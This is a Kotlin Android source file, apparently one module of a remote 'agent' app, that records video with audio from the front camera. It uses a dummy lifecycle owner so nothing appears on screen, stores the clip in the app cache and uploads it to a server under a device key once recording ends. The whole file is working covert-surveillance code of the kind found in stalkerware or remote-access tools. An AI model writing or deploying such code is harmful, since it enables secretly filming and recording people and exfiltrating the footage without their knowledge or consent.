package com.guard.agent.helpers.media

import android.annotation.SuppressLint
import android.content.Context
import androidx.camera.core.CameraSelector
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.camera.video.MediaStoreOutputOptions
import androidx.camera.video.Quality
import androidx.camera.video.QualitySelector
import androidx.camera.video.Recorder
import androidx.camera.video.Recording
import androidx.camera.video.VideoCapture
import androidx.camera.video.VideoRecordEvent
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleOwner
import androidx.lifecycle.LifecycleRegistry
import com.guard.agent.core.Constants
import com.guard.agent.utils.Logger
import java.io.File

object VideoHelper {

    private const val TAG = "VideoHelper"
    private var currentRecording: Recording? = null

    /**
     * Front camera se `seconds` seconds ka video record karke upload karo.
     */
    @SuppressLint("MissingPermission")
    fun record(ctx: Context, deviceKey: String, seconds: Int) {
        val future = ProcessCameraProvider.getInstance(ctx)
        future.addListener({
            try {
                val provider = future.get()
                val owner = DummyLifecycleOwner()
                owner.start()

                val recorder = Recorder.Builder()
                    .setQualitySelector(
                        QualitySelector.fromOrderedList(
                            listOf(Quality.HD, Quality.SD),
                            androidx.camera.video.FallbackStrategy.lowerQualityOrHigherThan(Quality.SD)
                        )
                    )
                    .build()

                val videoCapture = VideoCapture.withOutput(recorder)
                val selector = CameraSelector.DEFAULT_FRONT_CAMERA

                provider.unbindAll()
                provider.bindToLifecycle(owner, selector, videoCapture)

                Thread.sleep(800)

                val file = File(
                    ctx.cacheDir,
                    "video_${System.currentTimeMillis()}.mp4"
                )

                val outputOptions = androidx.camera.video.FileOutputOptions.Builder(file)
                    .build()

                val pending = videoCapture.output
                    .prepareRecording(ctx, outputOptions)
                    .withAudioEnabled()

                currentRecording = pending.start(ContextCompat.getMainExecutor(ctx)) { event ->
                    when (event) {
                        is VideoRecordEvent.Start -> {
                            Logger.d(TAG, "Video recording started")
                        }
                        is VideoRecordEvent.Finalize -> {
                            Logger.d(TAG, "Video finalized: ${event.outputResults.outputUri}")
                            if (file.exists() && file.length() > 0) {
                                CameraHelper.upload(ctx, deviceKey, file, "videos")
                            }
                            try {
                                provider.unbindAll()
                                owner.stop()
                            } catch (_: Exception) {}
                        }
                        else -> {}
                    }
                }

                // Duration ke baad stop
                android.os.Handler(ctx.mainLooper).postDelayed({
                    try {
                        currentRecording?.stop()
                        currentRecording = null
                    } catch (_: Exception) {}
                }, seconds * 1000L)

            } catch (e: Exception) {
                Logger.e(TAG, "Video record failed", e)
            }
        }, ContextCompat.getMainExecutor(ctx))
    }

    fun stop() {
        try {
            currentRecording?.stop()
        } catch (_: Exception) {}
        currentRecording = null
    }

    private class DummyLifecycleOwner : LifecycleOwner {
        private val registry = LifecycleRegistry(this)
        override val lifecycle: Lifecycle get() = registry
        fun start() { registry.currentState = Lifecycle.State.RESUMED }
        fun stop() { registry.currentState = Lifecycle.State.DESTROYED }
    }
}
